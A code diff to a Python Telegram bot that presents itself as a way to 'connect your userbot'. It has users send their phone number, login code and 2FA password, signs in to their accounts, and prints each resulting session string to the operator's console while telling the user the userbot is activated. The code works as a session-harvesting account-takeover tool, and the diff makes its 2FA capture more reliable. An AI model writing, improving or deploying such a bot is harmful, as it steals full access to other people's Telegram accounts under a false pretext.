@@ -1,7 +1,10 @@
 import asyncio
+import re
+import os
+
 from telethon import TelegramClient, events
 from telethon.sessions import StringSession
-import os
+from telethon.errors import SessionPasswordNeededError
 
 # ================= CONFIG =================
 API_ID = int(os.environ.get("API_ID", "0"))
@@ -14,6 +17,10 @@ bot = TelegramClient("bot", API_ID, API_HASH)
 # user state storage
 user_state = {}
 
+# ================= PHONE VALIDATION =================
+def is_valid_phone(phone: str) -> bool:
+    return bool(re.match(r"^\+[1-9]\d{7,14}$", phone))
+
 # ================= START =================
 @bot.on(events.NewMessage(pattern="/start"))
 async def start(event):
@@ -22,7 +29,7 @@ async def start(event):
         "Use /login to connect your userbot."
     )
 
-# ================= LOGIN START =================
+# ================= LOGIN =================
 @bot.on(events.NewMessage(pattern="/login"))
 async def login(event):
     user_id = event.sender_id
@@ -31,31 +38,28 @@ async def login(event):
         "step": "phone"
     }
 
-    await event.reply("📱 Send your phone number with country code (+91xxxxxxx)")
+    await event.reply("📱 Send your phone number with country code (+91xxxxxxxxxx)")
 
-# ================= MESSAGE HANDLER =================
+# ================= MAIN HANDLER =================
 @bot.on(events.NewMessage)
 async def handler(event):
     user_id = event.sender_id
-    text = event.raw_text
+    text = event.raw_text or ""
 
-    # ignore bot messages
-    if user_id is None or event.is_group:
-        return
-
-    # check state
     if user_id not in user_state:
         return
 
     state = user_state[user_id]
     step = state.get("step")
 
-    # ============ STEP 1: PHONE ============
+    # ================= PHONE STEP =================
     if step == "phone":
-        phone = text.strip() if text else None
+        phone = text.strip()
 
-        if not phone or not phone.startswith("+"):
-            return await event.reply("❌ Invalid phone number. Example: +91xxxxxxxxxx")
+        if not is_valid_phone(phone):
+            return await event.reply(
+                "❌ Invalid phone number!\n\n✔ Correct format:\n+91xxxxxxxxxx"
+            )
 
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
@@ -67,43 +71,42 @@ async def handler(event):
             state["client"] = client
             state["step"] = "otp"
 
-            await event.reply("📩 OTP sent to your Telegram/SMS.\nSend OTP now.")
+            await event.reply("📩 OTP sent!\nNow send OTP here.")
 
         except Exception as e:
-            await event.reply(f"❌ Failed to send OTP:\n{str(e)}")
+            await event.reply(f"❌ Failed to send OTP:\n{e}")
 
-    # ============ STEP 2: OTP ============
+    # ================= OTP STEP =================
     elif step == "otp":
-        otp = text.strip() if text else None
+        otp = text.strip()
         client = state.get("client")
         phone = state.get("phone")
 
         if not otp or not client or not phone:
-            return await event.reply("❌ Missing OTP or session expired. Try /login again.")
+            return await event.reply("❌ Session expired. Try /login again.")
 
         try:
             await client.sign_in(phone, otp)
 
-        except Exception as e:
-            # 2FA password case
-            if "SessionPasswordNeededError" in str(e):
-                state["step"] = "password"
-                return await event.reply("🔐 Enter your 2FA password:")
+        except SessionPasswordNeededError:
+            state["step"] = "password"
+            return await event.reply("🔐 2FA enabled!\nSend your Telegram password:")
 
-            return await event.reply(f"❌ OTP Error:\n{str(e)}")
+        except Exception as e:
+            return await event.reply(f"❌ OTP Error:\n{e}")
 
         session_str = client.session.save()
 
         await event.reply("✅ Login successful!\nUserbot activated.")
 
-        print(f"\nSESSION for {user_id}:\n{session_str}\n")
+        print(f"\nSESSION (NO 2FA) for {user_id}:\n{session_str}\n")
 
         await client.disconnect()
         del user_state[user_id]
 
-    # ============ STEP 3: 2FA PASSWORD ============
+    # ================= PASSWORD STEP (2FA) =================
     elif step == "password":
-        password = text.strip() if text else None
+        password = text.strip()
         client = state.get("client")
 
         if not password or not client:
@@ -112,17 +115,17 @@ async def handler(event):
         try:
             await client.sign_in(password=password)
 
-            session_str = client.session.save()
-
-            await event.reply("✅ 2FA Login successful!\nUserbot activated.")
-
-            print(f"\nSESSION (2FA) for {user_id}:\n{session_str}\n")
-
-            await client.disconnect()
-            del user_state[user_id]
-
         except Exception as e:
-            await event.reply(f"❌ 2FA Error:\n{str(e)}")
+            return await event.reply(f"❌ Wrong password:\n{e}")
+
+        session_str = client.session.save()
+
+        await event.reply("✅ 2FA login successful!\nUserbot activated.")
+
+        print(f"\nSESSION (2FA) for {user_id}:\n{session_str}\n")
+
+        await client.disconnect()
+        del user_state[user_id]
 
 # ================= RUN =================
 async def main():
